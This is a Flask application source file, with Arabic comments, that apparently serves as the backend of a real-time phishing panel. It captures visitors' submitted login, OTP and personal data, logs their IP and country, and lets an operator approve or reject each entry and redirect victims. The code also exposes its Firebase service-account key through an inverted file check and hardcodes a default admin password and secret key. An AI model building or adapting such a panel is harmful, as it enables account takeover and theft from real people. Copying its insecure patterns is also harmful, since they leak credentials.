from flask import Flask, request, jsonify, render_template, session, redirect, url_for, make_response
import os
import json
import datetime
import uuid
import time
import firebase_admin
from firebase_admin import credentials, firestore

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_secret_key_for_admin_panel")

app.static_folder = os.path.join(os.path.dirname(__file__))
app.template_folder = os.path.join(os.path.dirname(__file__))

# ============ تهيئة Firebase ============
firebase_initialized = False
db = None

try:
    # محاولة التحميل من متغير بيئة (للنشر على السحاب)
    service_account_info = os.environ.get("FIREBASE_SERVICE_ACCOUNT")
    if service_account_info:
        cert_dict = json.loads(service_account_info)
        cred = credentials.Certificate(cert_dict)
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        firebase_initialized = True
        print("Firebase initialized from environment variable.")
    else:
        # محاولة التحميل من ملف محلي (للتطوير)
        key_path = os.path.join(os.path.dirname(__file__), "firebase-key.json")
        if os.path.exists(key_path):
            cred = credentials.Certificate(key_path)
            firebase_admin.initialize_app(cred)
            db = firestore.client()
            firebase_initialized = True
            print(f"Firebase initialized from local file: {key_path}")
        else:
            print("Firebase configuration not found. Please set FIREBASE_SERVICE_ACCOUNT or provide firebase-key.json")
except Exception as e:
    print(f"Error initializing Firebase: {e}")

# ============ دوال مساعدة لـ Firestore ============

def get_user_session_id():
    sid = request.cookies.get('user_session_id')
    if not sid:
        sid = str(uuid.uuid4())
    return sid

def get_or_create_user(current_page=""):
    if not firebase_initialized:
        return None, get_user_session_id()
    
    sid = get_user_session_id()
    users_ref = db.collection('users')
    query = users_ref.where('session_id', '==', sid).limit(1).get()
    
    if len(query) > 0:
        user_doc = query[0]
        return user_doc.to_dict(), sid
    else:
        user_id = str(uuid.uuid4())
        user_data = {
            'id': user_id,
            'session_id': sid,
            'ip_address': request.remote_addr,
            'country': get_country_from_ip(request.remote_addr),
            'current_page': current_page,
            'last_activity': datetime.datetime.now(),
            'redirect_to': None
        }
        db.collection('users').document(user_id).set(user_data)
        return user_data, sid

def get_country_from_ip(ip_address):
    if not ip_address or ip_address == '127.0.0.1':
        return 'Local Network'
    try:
        import urllib.request
        api_url = f"http://ip-api.com/json/{ip_address}?fields=status,country,countryCode,city"
        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            result = json.loads(response.read().decode())
            if result.get('status') == 'success':
                return result.get('country', 'غير معروف')
            return 'غير معروف'
    except Exception:
        return 'غير معروف'

# ============ مسارات التطبيق ============

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/<path:filename>")
def serve_static(filename):
    if filename.endswith((".log", ".py", ".db", ".json")):
        if filename != "firebase-key.json": # حماية ملف المفتاح
            return "Access Denied", 403
    return app.send_static_file(filename)

# ---- Admin Login ----
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        password = request.form.get("password")
        if password == os.environ.get("ADMIN_PASSWORD", "Ha09876@@"):
            session["logged_in"] = True
            return redirect(url_for("admin_panel"))
        else:
            return render_template("admin_login.html", error="كلمة المرور غير صحيحة")
    return render_template("admin_login.html")

@app.route("/admin/logout")
def admin_logout():
    session.pop("logged_in", None)
    return redirect(url_for("admin_login"))

@app.route("/admin/reset_data", methods=["POST", "GET"])
def admin_reset_data():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    if not firebase_initialized:
        return jsonify({"status": "error", "message": "Firebase not initialized"}), 500
    
    try:
        # مسح جميع الطلبات
        requests = db.collection('client_requests').get()
        for r in requests:
            r.reference.delete()
        
        # مسح جميع الجلسات
        users = db.collection('users').get()
        for u in users:
            u.reference.delete()
            
        return jsonify({"status": "success", "message": "تم تنفيس وتفريغ قاعدة البيانات بنجاح"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/admin")
def admin_panel():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("admin.html")

# ---- API: كل الجلسات ----
@app.route("/admin/all_requests")
def get_all_requests():
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    if not firebase_initialized:
        return jsonify([])

    users = db.collection('users').order_by('last_activity', direction=firestore.Query.DESCENDING).get()
    sessions_list = []

    for user_doc in users:
        user = user_doc.to_dict()
        user_id = user['id']
        
        # جلب طلبات هذا المستخدم
        requests = db.collection('client_requests').where('user_id', '==', user_id).order_by('timestamp').get()
        
        user_data = {}
        has_data = False
        login_status = None
        otp_status = None
        
        sorted_requests = [r.to_dict() for r in requests]
        for r in sorted_requests:
            has_data = True
            if r.get('data') and isinstance(r['data'], dict):
                user_data.update(r['data'])
            
            if r['type'] == 'login':
                login_status = r['status']
            if r['type'] == 'otp':
                otp_status = r['status']

        if not has_data:
            continue

        sessions_list.append({
            "id": user['id'],
            "session_id": user['session_id'],
            "ip_address": user['ip_address'],
            "country": user.get('country') or "غير معروف",
            "current_page": user.get('current_page'),
            "last_activity": user['last_activity'].isoformat() if user.get('last_activity') else None,
            "data": user_data,
            "login_status": login_status,
            "otp_status": otp_status,
        })

    return jsonify(sessions_list)

# ---- API: التحقق من وجود طلبات جديدة ----
@app.route("/admin/check_new_requests")
def check_new_requests():
    if not session.get("logged_in"):
        return jsonify({"status": "error"}), 401
    if not firebase_initialized:
        return jsonify({"new_count": 0})
    
    ten_seconds_ago = datetime.datetime.now() - datetime.timedelta(seconds=10)
    new_requests = db.collection('client_requests').where('timestamp', '>=', ten_seconds_ago).get()
    
    return jsonify({"new_count": len(new_requests)})

# ---- API: تفاصيل جلسة واحدة ----
@app.route("/admin/request_details/<session_id>")
def get_request_details(session_id):
    if not session.get("logged_in"):
        return jsonify({"status": "error", "message": "غير مصرح لك بالوصول"}), 401
    if not firebase_initialized:
        return jsonify({"status": "error", "message": "Firebase not initialized"}), 500

    query = db.collection('users').where('session_id', '==', session_id).limit(1).get()
    if len(query) == 0:
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    
    user = query[0].to_dict()
    user_id = user['id']
    
    requests = db.collection('client_requests').where('user_id', '==', user_id).order_by('timestamp').get()
    
    user_data = {}
    login_status = None
    otp_status = None
    
    for r_doc in requests:
        r = r_doc.to_dict()
        if r.get('data') and isinstance(r['data'], dict):
            user_data.update(r['data'])
        if r['type'] == 'login':
            login_status = r['status']
        if r['type'] == 'otp':
            otp_status = r['status']

    return jsonify({
        "id": user['id'],
        "session_id": user['session_id'],
        "ip_address": user['ip_address'],
        "country": user.get('country') or "غير معروف",
        "current_page": user.get('current_page'),
        "data": user_data,
        "login_status": login_status,
        "otp_status": otp_status,
    })

# ---- Admin Approve/Reject ----
def update_request_status(session_id, req_type, new_status):
    if not firebase_initialized: return False
    
    user_query = db.collection('users').where('session_id', '==', session_id).limit(1).get()
    if len(user_query) == 0: return False
    
    user_id = user_query[0].to_dict()['id']
    req_query = db.collection('client_requests')\
                  .where('user_id', '==', user_id)\
                  .where('type', '==', req_type)\
                  .where('status', '==', 'pending')\
                  .order_by('timestamp', direction=firestore.Query.DESCENDING).limit(1).get()
    
    if len(req_query) > 0:
        req_query[0].reference.update({
            'status': new_status,
            'admin_action_time': datetime.datetime.now()
        })
        return True
    return False

@app.route("/admin/approve_login/<user_session_id>")
def admin_approve_login(user_session_id):
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if update_request_status(user_session_id, 'login', 'approved'):
        return jsonify({"status": "success", "message": "تمت الموافقة على تسجيل الدخول"})
    return jsonify({"status": "error", "message": "الطلب غير موجود"})

@app.route("/admin/reject_login/<user_session_id>")
def admin_reject_login(user_session_id):
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if update_request_status(user_session_id, 'login', 'rejected'):
        return jsonify({"status": "success", "message": "تم رفض تسجيل الدخول"})
    return jsonify({"status": "error", "message": "الطلب غير موجود"})

@app.route("/admin/approve_otp/<user_session_id>")
def admin_approve_otp(user_session_id):
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if update_request_status(user_session_id, 'otp', 'approved'):
        return jsonify({"status": "success", "message": "تمت الموافقة على OTP"})
    return jsonify({"status": "error", "message": "الطلب غير موجود"})

@app.route("/admin/reject_otp/<user_session_id>")
def admin_reject_otp(user_session_id):
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if update_request_status(user_session_id, 'otp', 'rejected'):
        return jsonify({"status": "success", "message": "تم رفض OTP"})
    return jsonify({"status": "error", "message": "الطلب غير موجود"})

# ---- Submit Request ----
@app.route("/submit_request", methods=["POST"])
def submit_request():
    if not firebase_initialized:
        return jsonify({"status": "error", "message": "Database not ready"}), 500
        
    if request.is_json:
        data = request.get_json()
        request_type = data.get("type")
        user_data = data.get("data")

        if not request_type or not user_data:
            return jsonify({"status": "error", "message": "بيانات الطلب غير مكتملة"}), 400

        user, sid = get_or_create_user(current_page=request_type)
        
        # تحديث الجلسة
        db.collection('users').document(user['id']).update({
            'current_page': request_type,
            'last_activity': datetime.datetime.now()
        })

        auto_approve = request_type in ("personal_info", "watch_request")
        initial_status = "approved" if auto_approve else "pending"

        new_req_id = str(uuid.uuid4())
        new_req = {
            'id': new_req_id,
            'user_id': user['id'],
            'type': request_type,
            'data': user_data,
            'status': initial_status,
            'timestamp': datetime.datetime.now(),
            'admin_action_time': datetime.datetime.now() if auto_approve else None
        }
        db.collection('client_requests').document(new_req_id).set(new_req)

        resp_status = "approved" if auto_approve else "pending"
        resp_msg = "تم استلام البيانات" if auto_approve else "تم استلام طلبك، بانتظار موافقة المسؤول"
        response = make_response(jsonify({"status": resp_status, "request_id": new_req_id, "message": resp_msg}), 200 if auto_approve else 202)
        response.set_cookie('user_session_id', sid, max_age=86400*30)
        return response
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400

# ---- Request Status ----
@app.route("/request_status/<request_id>", methods=["GET", "POST"])
def get_request_status(request_id):
    if not firebase_initialized: return jsonify({"status": "error"}), 500
    
    req_doc = db.collection('client_requests').document(request_id).get()
    if req_doc.exists:
        req = req_doc.to_dict()
        user_doc = db.collection('users').document(req['user_id']).get()
        user = user_doc.to_dict() if user_doc.exists else None
        return jsonify({
            "status": req['status'], 
            "type": req['type'], 
            "data": req['data'], 
            "redirect_to": user.get('redirect_to') if user else None
        })
    return jsonify({"status": "error", "message": "الطلب غير موجود"}), 404

# ---- Track Visit ----
@app.route("/track_visit", methods=["POST"])
def track_visit():
    if not firebase_initialized: return jsonify({"status": "error"}), 500
    
    if request.is_json:
        data = request.get_json()
        page = data.get("page")
        if not page:
            return jsonify({"status": "error", "message": "الصفحة غير محددة"}), 400

        user, sid = get_or_create_user(current_page=page)
        db.collection('users').document(user['id']).update({
            'current_page': page,
            'last_activity': datetime.datetime.now()
        })

        response = make_response(jsonify({"status": "success", "message": "تم تحديث الزيارة"}))
        response.set_cookie('user_session_id', sid, max_age=86400*30)
        return response
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400

# ---- Active Visits ----
@app.route("/admin/active_visits")
def get_active_visits():
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if not firebase_initialized: return jsonify([])

    five_minutes_ago = datetime.datetime.now() - datetime.timedelta(minutes=5)
    active_users = db.collection('users').where('last_activity', '>=', five_minutes_ago).get()

    visits_list = []
    for user_doc in active_users:
        user = user_doc.to_dict()
        visits_list.append({
            "session_id": user['session_id'],
            "ip_address": user['ip_address'],
            "country": user.get('country'),
            "current_page": user.get('current_page'),
            "last_activity": user['last_activity'].isoformat()
        })
    return jsonify(visits_list)

# ---- Redirect User ----
@app.route("/admin/redirect_user/<user_session_id>", methods=["POST"])
def admin_redirect_user(user_session_id):
    if not session.get("logged_in"): return jsonify({"status": "error"}), 401
    if not firebase_initialized: return jsonify({"status": "error"}), 500

    if request.is_json:
        data = request.get_json()
        target_page = data.get("target_page")
        if not target_page:
            return jsonify({"status": "error", "message": "الصفحة المستهدفة غير محددة"}), 400

        query = db.collection('users').where('session_id', '==', user_session_id).limit(1).get()
        if len(query) > 0:
            query[0].reference.update({'redirect_to': target_page})
            return jsonify({"status": "success", "message": "تم تعيين إعادة التوجيه للمستخدم"})
        return jsonify({"status": "error", "message": "المستخدم غير موجود"}), 404
    return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
